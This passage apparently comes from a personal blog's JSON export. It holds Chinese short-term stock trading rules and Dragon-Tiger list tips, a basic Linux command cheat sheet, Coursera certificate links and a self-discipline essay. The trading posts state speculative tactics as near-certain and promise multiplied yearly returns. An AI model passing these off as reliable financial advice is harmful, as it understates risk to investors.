2、买方中的买一席位是机构最好，并且卖方的5个席位中不出现机构最好；\n\n3、如果买方席位和卖方席位均有机构出现，卖方的5个席位中机构出现的数量越少越好，金额越小越好。如果卖方的机构席位比买方机构席位旗鼓相当甚至还要多，说明机构之间分歧非常之大，短期方向具有不确定性，对于交易数据当中的游资席位来说也会打退堂鼓，应该观望等待明朗。\n\n4、当买方5个席位均为游资，而卖方所有席位均为机构的时候，说明机构早就有出局的想法，有可能是该股基本面发生了转变，或者其他的不确定性让机构调仓换股。另外这种情况也经常发生在股价炒作末期的高位，机构认为风险较大时就会组团出货，通常砸至跌停。\n\n5、当买方均为机构卖方全部为游资席位，如果股价已经在炒作高位，发生这样的交易数据则机构有利益输送嫌疑，利用机构效应吸引散户高位接盘来帮助游资顺利出货。记住：市场上没有100%的完美，太美好的东西其背后一定掩饰着什么。\n\n\n## 超短\n\n以下是一个很激进的原则，并不能认可太多\n\n超短线的精髓在于做的是自己市值的主升浪，而不是某支股票的主升浪。从百万到千万到亿，是做人生的主升浪。这个大逻辑必须非常清楚。我很懂，自己为何做超短线！目标必须是亿为单位，不能目光短浅！我的操作纪律：\n\n1.永不抄底，只做强势股追涨，只做上升通道。\n\n2.不做日成交额低于5亿的股票。\n\n3.持股周期1~3天，连扳预期除外，坚决不把超短投机失败了当价值投资来搞。\n\n4.只选热点概念和有板块效应的标，判断失败搞错热点果断割肉出货，热点持续卖飞再买回来，老想卖山顶的都是屌丝，卖飞买回来才是高富帅。\n\n5.只做牛票，不做牛市，宁可卖飞，也不傻等。\n\n选择交易这一行，挫折感和失败感会伴随我们一生，失败时我们会郁闷、会痛苦、会绝望；胜利时，我们会目空一切，以为自己掌握了股市赚钱的法宝，这些将会重复，未来将战无不胜，万亿富翁指日可待。交易虽时而欲哭无泪，时而高兴流泪，但我们却依然爱它，因为平淡的生活乏味，挑战的生活才有激情，才有梦想。在预判中跟随， 在跟随中应变，没有预判的跟随是盲从， 没有应变的预判是意淫。找对路，并坚持！\n\n生活里注定会有许多风雨，认识人生是一种欣然的态度和热爱，一路上的经过，如果你坚持不下去了，请想想当初的那般热情。股市常有迷茫的时候，只要熬过了，就没什么可以打败你。\n\n> 它文章挺老了，但是毕竟是经验\n\n## 《什么样的人不适合做超短》\n\n1.上班族，请不要做超短。\n\n2.没有强大的内心，股票随便动一下就激动的，请不要做超短。\n\n3.做不到一天四小时盯盘，盘后至少四个小时复盘的，请不要做超短。\n\n4.对技术面一窍不通的，请不要做超短。\n\n5.新入市两年内的韭菜，请不要做超短。\n\n6.没有独立思考判断能力的，请不要做超短。\n\n7.有家庭生活压力的，请不要做超短。\n\n8.盘中无法做到跟随应变的，请不要做超短。\n\n9.无法容忍回撤，做不好风控的，请不要做超短\n\n10.买卖点都在一瞬间，肾不好的，请不要做超短。\n\n## 《什么样的股票不能买》\n\n1、大势趋向空时，不买，买多不买空\n\n2、整体板块走势不好时，不买，龙头板块，行情需要3、30日均线正在下降或股价处于30日均线下方的，不买，破生命线\n\n4、股性不好的股票，不买，买股买善庄\n\n5、突破点成交量表现不佳的，不买。换手率不够不买\n\n6、成交量巨量时不买，巨量止盈不买\n\n7、能量或动量过大时不买，涨幅过高却没有调整不买\n\n8、技术指标不成熟的股票，不买，油未加足\n\n9、当价格趋势后势不明朗时不买，方向不明不买\n\n10、不具有宽广底部的股票不买，横有多长，竖有多高\n\n11、正在缓慢下跌，已走下降通道的个股，不买，下水道中无好货\n\n12、曾被恶炒过，庄家已撤离或正在撤离的个股，不买，花无百日红\n\n13、盘整时期，在盘中突然拉起一根大阳线的股票，不买，积弱难返\n\n14、突破盘局后，已出现连续三根大阳线且无调整（30%以上）不买\n\n15、第一次冲高到前期高点附近，只要不涨停不买，挑顶卖货\n\n16、不具备短均线多头排列不买，均线不好\n\n17、不论走势如何好，也不买涨势发动太久之后的股票，追高不买\n\n18、宁可错过一次赚钱的机会，也不买任何风险大于报酬的个股\n\n19、只要身在股市，就永远不猜测底部，也不预测顶部，终生顺势而为\n\n20、每波行情中，总有主流、支流、末流（跟风）板块之分，要想跑赢大势，就必须紧跟主流板块，特别是领涨股！骑马要骑大黑马，买股要买龙头股\n\n## 纪律篇\n\n1.炒作题材股就是讲故事，不管故事是真的还是假的，只要讲的好就行。　　\n\n2.成交量已很小很长时间了，只要量不放大就以横盘下跌为主，可以先出来，即使反弹如果量还这么小的话高度有限。等成交量大了再进去，免得在里面受折磨。　　\n\n3.不要买入太多的太便宜的股票，低于5元的股票都是很垃圾的，不要以为便宜就不跌了，往往这样的股票反弹的很慢，重点关注10元左右的股票，活跃度比较高。　　\n\n4.选择自己熟悉的股票进行投资，对于熟悉的股票，我们已经知道它的“脾气”，知道何时买何时卖。    \n\n5.买股票一定要冷静，必须有80%以上的把握，宁愿踏空也不要被套。赚钱了卖股可以随意一些，只是赚多赚少的问题。一定要锻炼自己的心理克服盲目追高。　　\n\n6.图很好已经形成了底部，并且持续放量依托5日线稳步上涨，符合我的选股标准。　　\n\n7.股性不活跃，比中石油和工行还笨，涨的很慢，被这样的股票套上了很麻烦。即使大盘再创新高这只股票也涨不了多少。　　\n\n8.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　\n\n9.买点非常关键，不论在什么行情，除非特别强势股，最好是逢低介入。    \n\n10.理智投资，克制情绪，投资股票要有良好的心理素质。股民通常都会对股票的涨跌产生情绪化，从而影响操作。切忌不可情绪化，一定要学会自我控制，理智投资。有时股民们会由于一时冲动而贸然建仓，也有时候会和某一支股票“较劲”，斩仓在“地板价”上。机会随时都会出现，没必要因一时冲动而导致资金大损。　　\n\n11.买股票不论哪个板快都要买龙头，我所说的龙头股不是名气大的盘子大的而是涨的多的、涨的快的股票。同样上涨龙头股比其他跟风的要多涨很多，而且又抗跌。要买就要买龙头股票，不能因为涨的多不敢买。比如近期的乐视网、全通教育等。　　\n\n12.在弱势中突破新高的股票值得重点关注。　　\n\n13.短线操作具备以下几个条件\n\n    1、要有原则不要计较一天的得失要敢于止损。\n    2、喜欢追热点要有胆量不怕追高。\n    3、我一般在开盘15分钟和收盘前30分钟买股票。　　\n\n14.大家买股票除了看指数外还要看上海市场涨幅超过6%的股票有多少，如果太少的话就不要参与。    \n\n15.止损和控制仓位是炒股的第一步，第二步就要锻炼自己的心理素质。在行情不好的时候尽量少参与，甚至一个星期买一次，每一次赚3%一年你也能赚很多。　　\n\n16.不但要有好股票，更重要的是买点和卖点，后者更关键这个只能靠自己把握。　　\n\n17.买的股票主要有以下三类\n\n    1.突破箱式震荡创新高的\n    2.热点题材股\n    3。底部放量的特别是现在形成头肩底或者双底走势的。　　\n\n18.如果资金不是很多的话股票最好不要超过3个。行情好的时候一般是2个行情不好的时候就1个。　　\n\n19.大盘在大幅上涨的时候一定要避免操作频繁，大盘震荡或下跌的时候频繁操作是好的。    \n\n20.大家以后买股票一定学习买点，再好的股票买高了也赚不到钱，再差的股票买的位置低也能赚钱。买卖点很关键甚至比股票好坏还重要。这个需要自己多观察多总结经验，最起码要学会看均线，短线看5日、10日线。大盘好的情况下，强势股调整一般不会破5日线，大盘差的时候顶多到10日线10日线是很好的介入机会。如果你大多数时间都在空仓专等强势股跌到10日线介入，假设一个月有3次这样的机会，每次赚8%，一年你都会赚好几倍。　　\n\n21.做短线要学会卖，不管手中的股票是涨是跌。在大盘不好的情况下只要手中的股票拉升，分批卖出以规避风险就没错。　　\n\n22.注重成交量，量在价先。看股主要看成交量，看成交量不用看K线图，基本就能知道一个股票的走势。　　\n\n23.我喜欢操作创新高的股票，一般来说创了新高的股票不会跌破前期的高点。这样的股票没有套牢盘，涨起来比较轻松，大都有比较凶悍的主力运作。买这样的股票是比较安全的。　　\n\n24.满仓持有一个股票，每天做T+0差价赚0.5%，难度并不大，一个月下来也有不错的收益。做T+0价差一定不能贪心要不很容易踏空。如果买入做差价，赚了一点卖一点，一边涨一边卖，防止一下跌很多。    \n\n25.果断出手，切忌犹豫不决。犹豫不决容易错失投资时机，在关键时期患得患失，不能把握到最佳的时机，说明他们对市场行情还没有准确的判断。在交易时要看成交量，如果指数大跌且成交量降到均量的一半以下，此时买进风险很低，正是投资的最佳时机，股民们应抓住这个时机，果断出手，切不可犹豫不决。　　\n\n26.从心理学的角度来说，越是认为是政策底往往就会跌破政策底。而且基金不讲政治，政府又出台不了实质性的政策，政策底往往是守不住的。　　\n\n27.大盘上方均线密集，没有一定的成交量是不可能突破的，即使突破了也会跌下来，所谓量在价先就是这个道理。　　\n\n28.KDJ中轴上方金叉不是坏事说明强势，这也是一直横盘整理的结果，BOLL线收窄选择方向。　　\n\n29.次新股最好不要碰这些股发行价都很高严重高估，上市后都要补跌。   \n\n30.缺口补的时间越长，大盘横盘的时间越长，对后市发展就越不利。　　\n\n31.炒股不能与趋势做对，更不能一相情愿。老是往好的地方想，总是想自己买的股票一定要涨。认为自己满仓了大盘明天肯定不会跌了。总是报有幻想在股市中是要不得的。　　\n\n32.波浪理论简单的说主要是上升5大浪，下跌3小浪，每一大浪又有多个小浪组成。虽然有马后炮的嫌疑，但从长远来看还是有很大借鉴意义的。　　\n\n33.我分析股票最重要的一个指标是成交量，一般来说股票要持续上涨必须要成交量放大，特别是股票技术横盘整理或向上突破重要点位必须拌有成交量放大。在连续上涨的股票中，只要当天的成交量高于上一天的成交量，如果大盘没有太大问题股票还是会冲高的。另除了成交量外首先要学会看均线排列和K线形态。掌握了这些基本就可以了。还有一些MACD、KDJ、BOLL等指标也比较常用，一般高手看了前面的均线排列、K线形态就知道后面这些指标的走势。当然分析的越全面越好多个指标同时用对股票把握的更准一些。　　\n\n34.一般来说能够连续拉升的股票，中后期一般开盘价不能超过2，如果过了说明庄家高开要放货了，一般低开1-2之间最好。    \n\n35.不要开盘就抛，这是一大忌。中间会有冲高的机会。　　\n\n36.当天要拉升的股票，一般来说控盘程度高，大盘跌它不怎么跌。对于短期涨幅不大的股票，波动空间很小上下不超过\n\n2。偶尔出现庄家对倒说明股票有异动。短期涨幅大的股票往往要下探到5日线。股票要拉升成交量要放大，一看放量了第一时间介入比晚介入要好。　　\n\n37.短线不入大盘股，短线不入机构重仓股，短线不入大小非股。　　\n\n38.股市的高手最主要的不是技术而是心理。只有心理成熟了你才能驾御这个市场。人的心理、性格、志向在股票操作中暴漏无遗。　　\n\n39.一般来说不要买跌停板上的股票。       \n\n40.不要受消息影响，去买所谓的抄底股，你不是庄家，不可能知道此时购买的就一定是股票最低价，所以在选股票的时候，要选走势强，升势最好的股票。　　\n\n41.永远不要相信电视台的股评“老师们”。如果他们真能说对明天哪只股票涨停，还有必要从事股评这份“很有前途的职业”么？　　\n\n42.你抓住一个股票的K线图，看了又看最终你会发现规律。　　\n\n43.普涨行情下不要频繁换股，普涨行情下买股票很容易被套要买就等收盘前2分钟买，因为好股票都涨停了，差的股票你买后很容易回落。　　\n\n44.强势股如果趁大盘跌而下跌，是很好的介入机会。       \n\n45.更多的人可能有这样的想法：如果买了这个股票总是想这个股票好的一面，不想它差的一面，甚至更听不进去别人说他不好。这种情况就是心理学中的选择性扭曲。　　\n\n46.一个股票虽然看好，但不一定什么时间都可以买。股票的买点和卖点非常关键比选择股票还重要。再好的股票没买到好位置也赚不了钱。所以如果错过了买入的机会，不要看到别人赚钱自己心理不平衡贸然就冲进去了，结果买在了最高点这是一大忌。克服了这一个毛病就能能成为股市的高手。　　\n\n48.有基金的股票很难大涨的，一涨它就卖。　　\n\n49.一大阴击穿所有的均线，应该也是离场的信号。　　\n\n50.大盘跳水不要急于卖股票等它再反弹一波的高点卖。更不能在急跌的时候卖股票这样很容易卖在最低价。\n\n## 《龙虎榜》\n\n看龙虎榜主要是为了揣摩当前市场中最活跃，最顶尖的资金操盘的思路，不管是机构也好游资也好，这些活跃在市场最前沿的资金基本代表了国内最顶尖的操盘水平。而通过龙虎榜观察他们的选股与操盘手法使自己的操作逻辑尽可能靠近市场主流资金的逻辑，这才是龙虎榜最大的意义，因为这些资金特别是游资基本都是小资金做大的，处于整个股市生物链的顶部。\n\n首先，什么是龙虎榜？龙虎榜是交易所公布的当日异动股票汇总。上榜主要有四个条件：1、日价格涨幅偏离值±7%\n\n2、日换手率达到20%\n\n3、日价格振幅达到15%\n\n4、连续三个交易日内，涨幅偏离值累计达到20%每个条件都选前3名的上榜，深市是分主板、中小板、创业板分别取前3的。具体的大家百度百科，解释龙虎榜不是今天的重点。\n\n大家应该看到了我上面加粗的两个字“异动”，关键就在这异动上面。谁才有能力让股票的价格出现异动，只有所谓的主力，散户的散单是肯定做不到的，说到主力很多人觉得很神秘，而且喜欢把机构统称主力，其实大家不必太看重名词上的东西，只要是能影响到股价走势的都是可以称为主力，包括机构跟游资。研究散户你永远只能是散户，只有研究主力才能让你进步，而龙虎榜就是我们研究主力操盘选股思路的最好窗口。其次，怎么看龙虎榜？龙虎榜上有两种席位，一种是机构席位，一种是游资席位。机构席位就是什么公募啊、私募啊等等法人账户，他们的资金一般是募集而来，且上榜统一名称为“机构专用”，所以没什么好研究的。而游资席位不一样，游资席位都是自然人账户，就是跟广大散户朋友账户一样的。且游资大部分都是从小资金做起来，而且可以持续跟踪关注，他们才是我们研究对象。","tags":["finance"],"categories":["Lifestyle"]},{"title":"Linux common command","url":"/2017/03/11/[tech]Linux-common-command/","content":"```\n查找超过10M的文件\n\n\tfind <PATH >-size +10M\n\nFind the files which modified since 120 days before\n\n\tfind ./ -mtime +120\n\nFind the file haven’t been visited within 90days\n\n\tfind ./ \\! -atime -90\n\nat命令用来安排一个程序在未来的做一次一次性执行。所有提交的任务都被放在 /var/spool/at 目录下并且到了执行时间的时候通过atd守护进程来执行。\n\nlspci命令用来显示你的系统上PCI总线和附加设备的信息。指定-v，-vv或-vvv来获取越来越详细的输出，加上-r参数的话，命令的输出则会更具有易读性。\n\n显示目录和文件的命令\n   Ls：用于查看所有文件夹的命令。\n   Dir：用于显示指定文件夹和目录的命令   Tree： 以树状图列出目录内容\n   Du：显示目录或文件大小 \n \n修改目录，文件权限和属主及数组命令\n   Chmod：用于改变指定文件的权限命令。\n   Chown：用于改变文件拥有属性的命令。\n   Chgrp：用于改变文件群组的命令。\n   Chattr：用于设置文件具有不可删除和修改权限。\n   Lsattr：用于显示文件或目录的隐藏属性。\n \n创建和删除目录的命令\n   Mkdir：用于创建目录\n   Rmdir：用于删除空的目录\n   Rm -f：用于删除不为空的目录\n \n创建和删除，重命名，复制文件的命令\n  Touch：创建一个新的文件\n   Vi:创建一个新的文件\n   Rm：删除文件或目录\n   Mv：重命名或移动文件的命令\n   Cp：复制命令\n\n \n显示文件内容的命令\n   Cat：用于显示指定文件的全部内容\n   More：用分页的形式显示指定文件的内容\n   Less：用分页的形式显示指定文件的内容，区别是more和less翻页使用的操作键不同。\n   Head：用于显示文件的前n行内容。\n   Tail：用于显示文件的后n行内容。\n   Tail -f：用于自动刷新的显示文件后n行数据内容。\n \n查找命令\n   Find：查找指定的文件。\n   Whereis：查找指定的文件源和二进制文件和手册等\n   Which：用于查询命令或别名的位置。\n   Locate：快速查找系统数据库中指定的内容。\n   Grep：查找文件里符合条件的字符串。\n \n关机和重启计算机的命令\n     \n   Shutdown：-r 关机后立即重启\n             -k 并不真正的关机，而只是发出警告信息给所有用户\n             -h 关机后不重新启动\n   Poweroff：用于关机和关闭电源\n   Init：改变系统运行级别\n        0级用于关闭系统\n        1 级用于单一使用者模式\n        2级用来进行多用户使用模式（但不带网络功能）\n        3级用来进行多用户使用模式（带网络全功能）\n        4级用来进行用户自定义使用模式\n        5级表示进入x  windows时的模式\n        6级用来重启系统\n   Reboot： 用于计算机重启\n   Halt：用于关闭计算机系统\n \n压缩和打包命令\n   Tar：用于多个文件或目录进行打包，但不压缩，同时也用命令进行解包\n   Gzip：用于文件进行压缩和解压缩命令，文件扩展名为.gz结尾。\n   Gunzip：用于对gzip压缩文档进行解压缩。\n   Bzip2：用于对文件或目录进行压缩和解压缩\n   Bzcat：用于显示压缩文件的内容。\n   Compress/un compress： 压缩/解压缩.Z文件\n   Zcat：查看z或gz结尾的压缩文件内容。\n   Gzexe：压缩可执行的文件\n   Unarg：解压缩.arj文件\n   Zip/unzip:压缩解压缩.zip文件\n \n用户操作命令\n   Su：切换用户命令\n   Sudo：一系统管理员的身份执行命令\n   Passwd：用于修改用户的密码\n \n改变目录和查看当前目录命令\n   Cd：进入工作目录\n   Cd 。。：会退到上一级命令\n   Pwd：显示当前用户所在工作目录位置\n \n文件连接命令\n   Ln：为源文件创建一个连接，并不将源文件复制一份，即占用的空间很小。\n        可以分为软件连接和硬链接。\n        软连接：也称为符号连接，即为文件或目录创建一个快捷方式。\n硬链接：给一个文件取多于一个名字，放在不同目录中，方便用户使用。\n \nLn命令参数如下：\n   -f：在创建连接时，先将与目的对象同名的文件或目录删除。\n   -d：允许系统管理者硬链接自己的目录。\n   -i：在删除与目的对象同名文件或目录时先询问用户。\n   -n：在创建软连接时，将目的对象视为一般的文件。\n   -s：创建软连接，即符号连接。\n   -v：在连接之前显示文件或目录名。\n   -b：将在连接时会被覆盖或删除的文件进行备份。\n \n帮助命令-----man\n其他命令\n   Who：显示系统中有那些用户在使用。\n        -ami  显示当前用户\n        -u：显示使用者的动作/工作\n        -s：使用简短的格式来显示\n        -v：显示程序版本\n   Free：查看当前系统的内存使用情况\n   Uptime：显示系统运行了多长时间\n   Ps：显示瞬间进程的动态\n   Top: 动态地显示进程\n   Pstree：以树状方式显示系统中所有的进程\n   Date：显示或设定系统的日期与时间。\n   Last：显示每月登陆系统的用户信息\n   Kill： 杀死一些特定的进程\n   Logout：退出系统\n   Useradd/userdel:添加用户/删除用户\n   Clear：清屏\n   Passwd：设置用户密码\n \n \nvi编辑器\n   首先用vi命令打开一个文件\n末行模式命令：\n   :n,m w path/filename 保存指定范围文档（ n表开始行，m表结束行）\n   :q!    对文件做过修改后，强制退出\n   :q     没有对文件做过修改退出\n   Wq或x  保存退出\n   dd   删除光标所在行\n   ： set number 显示行号\n   ：n 跳转到n行\n   ：s  替换字符串 :s/test/test2/g  /g全局替换 /也可以用%代替\n   / 查找字符串\n \n网络通信常用的命令\n   Arp：网络地址显示及控制\n   ftp：文件传输\n   Lftp：文件传输\n   Mail：发送/接收电子邮件\n   Mesg：允许或拒绝其他用户向自己所用的终端发送信息\n   Mutt E-mail 管理程序\n   Ncftp ：文件传输\n   Netstat：显示网络连接.路由表和网络接口信息\n   Pine：收发电子邮件，浏览新闻组\n   Ping：用于查看网络是否连接通畅\n   Ssh：安全模式下远程登陆\n   Telnet：远程登录\n   Talk：与另一用户对话\n   Traceroute：显示到达某一主机所经由的路径及所使用的时间。\n   Wget：从网路上自动下载文件\n   Write：向其它用户终端写信息    Rlogin：远程登录\n\n\n\n如今出去面试多少都会被问及个linux的问题， 而且项目进uat后也都要发到linux下， 所以知道几个linux命令是必要的。\n 第一个，也是最有用的一个：\nman 察看命令详解,只要觉得哪个命令不清楚，man它就可以了.\n   man ls\n ln 创建链接文件\n  ln -s sourceName destName\n ls 列出文件  -l: 逐行显示且列出详细属性  -a: 列出所有文件包括以.开头的隐藏文件\n  ls -lqt /bin\ncat 读取文本内容\n  -n: 显示行号  -b: 显示行号且忽略空行\n  cat -n 1.txt\n \nwc: 计数  -l: 行数  -w: 字数  -c: 字符数  wc -l file1 file2 ......可以统计多个文件\n \ncp 拷贝文件 目录  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 拷贝目录  cp file1 file2 file3.... dir 表示将file1,file2...拷贝到dir  cp -r dir1 dir2 dir3... dirn 将dir1, dir2,dir3...拷贝到dirn\n \nfile 察看文件类型\n  file test.sh\n \nmv 移动文件，更改文件名  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 移动目录，跟改目录名\n \nrm 删除文件\n  -i: 交互模式，询问是否删除  rm -r dir1 dir2 dir3...可删除多个\n \nmkdir 创建目录  -p: parent,父目录不存在，则创建父目录\n  mkdir -p test/test\n \nrmdir 删除目录  等同与rm -r  rmdir dir1 dir2 dir3 ....  rm -r dir1 dir2 dir3 ....\nchmod 更改权限  chmod -R 777 DIR改变目录下所有文件权限为777，必须是-R\n 权限 -rwxrwxrwx         421421421  最前面的-表示文件类型为普通文件  接下来三位表示所有者权限  接下来三位表示组权限  最后三位表示其它用户权限  如果某一权限没有被分配，用-表示。-rwxr--rwx表示组没有写和执行权限  文件加夜有可执行权限，但表示是否容许在该目录下寻找文件\nchown 改变所有者\n\nchgrp 改变组\n\ncommand &  命令后面加&表示在后台运行  find . -name \"*.sh\"&\nfg 把后台进程放到前台  fg %1 把后台第一个作业放到前台\nbg  把前台进程放到后台\njobs  显示后台或挂起的进程\nps   显示所有进程  ps -f 显示完全信息，包括占用cpu时间，开始时间。。。\nkill  -9 强制结束   more 显示文本内容，每次一屏，按空格继续  find / -name \"*.sh\" | more\ntail 从指定的位置开始显示后面得内容  tail -f server.log 用于在server上边运行边察看日志  tail -10 dos2unix.sh 察看最后10行\nhead  与tail对应\nsort 排序  -r 逆序  -d 字典顺序  ls | sort -r\ntr  字符替换\n  -d 删除指定字符  ls | tr -d 'log'  ls | tr 'd' 'g'把d变成g\nat time date job  定时调度\ncompress  -f 压缩文件  -v 显示压缩比例  compress -vf project.tar 将产生project.tar.Z且project.tar被删除\nuncompress  -f 解压缩文件  -v 显示压缩比例  uncompress project.tar.Z 将产生project.tar且project.tar.Z被删除  tar  -c 创建新文档  -x 解包  -v 显示正在处理的文件名  -f 取代默认的文件名  tar -cvf project.tar project/* 把project目录下所有文件打包  tar -xvf project.tar\n\n\n\n crontab \n　　使用权限 : 所有使用者 \n　　\n　　使用方式 : \n　　\n　　crontab [ -u user ] file \n　　crontab [ -u user ] { -l | -r | -e } \n　　\n\n　　crontab   指定使用者在固定时间执行程序，换句话说，即使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。 \n```","tags":["linux"],"categories":["Tech"]},{"title":"Coursera Certificate","url":"/2016/12/31/Coursera-Certificate/","content":"\nThis page is used for storing coursera certificate:\n\n- [Business Metrics for Data-Driven Companies](https://www.coursera.org/account/accomplishments/certificate/3FA8KTMMZAE8)\n- [Business - Customer Analytics](https://www.coursera.org/account/accomplishments/certificate/2ARVFK73G7TD)\n- [Data Science in Python](https://www.coursera.org/account/accomplishments/certificate/9K397R9VGJP9)\n- [The Data Scientist’s Toolbox](https://www.coursera.org/account/accomplishments/certificate/2ZYVT2V9EJVT)\n- [Databases with Python](https://www.coursera.org/account/accomplishments/certificate/AXSLNFRFVEJW)\n- [Web Python](https://www.coursera.org/account/accomplishments/certificate/JTCJXZEXS4BK)\n- [Python Data Structure](https://www.coursera.org/account/accomplishments/certificate/VP3EJGFDKWU4)\n- [Getting and Cleaning Data](https://www.coursera.org/account/accomplishments/certificate/H6S7KS99RTJP)\n- [R Programming](https://www.coursera.org/account/accomplishments/certificate/24PB885RTJXG)"},{"title":"The odyssey of Self-Discipline","url":"/2016/12/30/The-odyssey-of-Self-Discipline/","content":"## Why I am so hard to stay disciplined?\n\nI'd known I am one of the ADHDer(not so heavy, but just always losing my focus). The worst side of the influence is not the symptom (never ever) but the untangible mind which unconciously affect my behavior. I learned a word -- preconception and suddenly be enlightened.\n\nI should be more self discipline and be more confident about my mind. \n\nBut why it is still so hard to stay disciplined?\n\n> Because we allow our mind to interface the path of discipline. Why do we fail to get in the early morning? Because the mind says, \"You are so tired and sleep deprived. Just sleep for 5 minute more and it will be fine\". Then % becomes 10, and it is all the way downhill after that.\n\nWe allow the fallacy that we will get up early or eat healthy or study well or do the right thing when we **get used to it and it becomes a little easier**. \n\nBut it will NEVER get easier. It will never be easy to get up at 5 am, every single day of the year. Not now, not after 10 years. \n\n## What should I do?\nThe answer maybe trivially simple, but also very hard. I must stop listening to my mind. Just stop. No concession to what my mind says.\n\nWhen I have to do something hard, I have to become a robot. It does not matter how I feel. Who cares? It does not matter how this thing will get well. Becuase it is a training, not just a task. I must get used to it and improve the way I used for handling stuff. At first, I just execute like the plan like a machine. \n\nThen I decide to go for a run, get up and run. I feel groggy and my legs hurt. The pain I feel is exactly the pain everybody else feels. The pain of discipline is the price of happiness. \n\n\n### People who win are those who keep going, regardless of how much it hurts.\n\n","tags":["methdology"],"categories":["Lifestyle"]}]